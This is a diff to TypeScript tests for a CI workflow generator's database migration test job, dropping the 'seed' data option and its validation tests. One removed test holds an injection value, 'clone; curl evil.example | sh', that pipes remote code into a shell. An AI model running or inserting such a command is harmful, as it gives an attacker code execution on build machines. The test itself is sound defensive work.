@@ -999,7 +999,7 @@ type Workflow = {
 };
 
 describe("renderBranchWorkflow migration test job", () => {
-  const migrationTest = { label: "tailor:migration-test", data: "clone" } as const;
+  const migrationTest = { label: "tailor:migration-test" };
   const render = (overrides: Partial<RenderBranchParams> = {}) => {
     const { content, generatedIds } = renderBranchWorkflow({
       ...branchBase,
@@ -1085,19 +1085,16 @@ describe("renderBranchWorkflow migration test job", () => {
     );
   });
 
-  test.each(["clone", "seed"] as const)(
-    "runs migration test with --data %s under a job time limit",
-    (data) => {
-      const { workflow } = render({ migrationTest: { ...migrationTest, data } });
-      const job = workflow.jobs["tailor-migration-test"]!;
-      const run = job.steps.find((step) => step.id === "tailor-migration-test");
+  test("runs migration test on cloned data with a clone timeout, under a job time limit", () => {
+    const { workflow } = render();
+    const job = workflow.jobs["tailor-migration-test"]!;
+    const run = job.steps.find((step) => step.id === "tailor-migration-test");
 
-      expect(run?.run).toContain(
-        `pnpm exec tailor tailordb migration test --data ${data} --yes ${data === "clone" ? "--clone-timeout 30m " : ""}--json`,
-      );
-      expect(job["timeout-minutes"]).toBe(60);
-    },
-  );
+    expect(run?.run).toContain(
+      "pnpm exec tailor tailordb migration test --data clone --yes --clone-timeout 30m --json",
+    );
+    expect(job["timeout-minutes"]).toBe(60);
+  });
 
   test("signs in with the machine user only in the login step", () => {
     const { workflow } = render();
@@ -2085,7 +2082,6 @@ export default defineConfig({
       baseOptions({
         workspaceName: "my-app",
         loadHasMigrations: async () => true,
-        loadHasSeeds: async () => false,
         migrationTest: true,
         ...overrides,
       });
@@ -2104,17 +2100,14 @@ export default defineConfig({
         inputs: {
           migrationTest: true,
           migrationTestLabel: "tailor:migration-test",
-          migrationTestData: "clone",
         },
       });
     });
 
-    test("records and renders a custom label, data kind, and dedicated environment", async () => {
+    test("records and renders a custom label and dedicated environment", async () => {
       await setupTarget(
         enabled({
-          loadHasSeeds: async () => true,
           migrationTestLabel: "run-migration-test",
-          migrationTestData: "seed",
           migrationTestEnvironment: "prod-source",
         }),
       );
@@ -2125,7 +2118,6 @@ export default defineConfig({
       expect(readLock(testDir)?.targets[0]).toMatchObject({
         inputs: {
           migrationTestLabel: "run-migration-test",
-          migrationTestData: "seed",
           migrationTestEnvironment: "prod-source",
         },
       });
@@ -2135,20 +2127,6 @@ export default defineConfig({
       await expect(setupTarget(enabled({ loadHasMigrations: async () => false }))).rejects.toThrow(
         /--migration-test.*migrations/,
       );
-    });
-
-    test("rejects seed data for a config without the seed plugin", async () => {
-      await expect(setupTarget(enabled({ migrationTestData: "seed" }))).rejects.toThrow(
-        /--migration-test-data seed.*seed plugin/,
-      );
-    });
-
-    test("rejects a data kind that is neither clone nor seed, which a tampered lock could carry", async () => {
-      await expect(
-        setupTarget(
-          enabled({ migrationTestData: "clone; curl evil.example | sh" as unknown as "clone" }),
-        ),
-      ).rejects.toThrow(/Invalid --migration-test-data/);
     });
 
     test("rejects the migration test options without --migration-test", async () => {
